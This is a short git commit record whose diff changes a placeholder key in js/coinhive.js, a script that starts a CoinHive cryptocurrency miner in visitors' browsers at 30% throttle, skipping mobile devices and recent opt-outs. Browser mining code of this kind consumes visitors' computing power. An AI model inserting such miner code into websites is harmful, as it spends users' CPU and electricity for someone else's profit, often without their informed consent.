c47718b2aff8cf580cf107c9ad87f2831012a7ec
strumswell <philipp.bukkit@gmail.com>
2018-05-28 17:03:36 +0200

    navigation

--- js/coinhive.js
+++ js/coinhive.js
@@ -1,4 +1,4 @@
-var miner = new CoinHive.Anonymous('publickey', {throttle: 0.3});
+var miner = new CoinHive.Anonymous('public_key', {throttle: 0.3});
 // Only start on non-mobile devices and if not opted-out
 // in the last 14400 seconds (4 hours):
 if (!miner.isMobile() && !miner.didOptOut(14400)) {
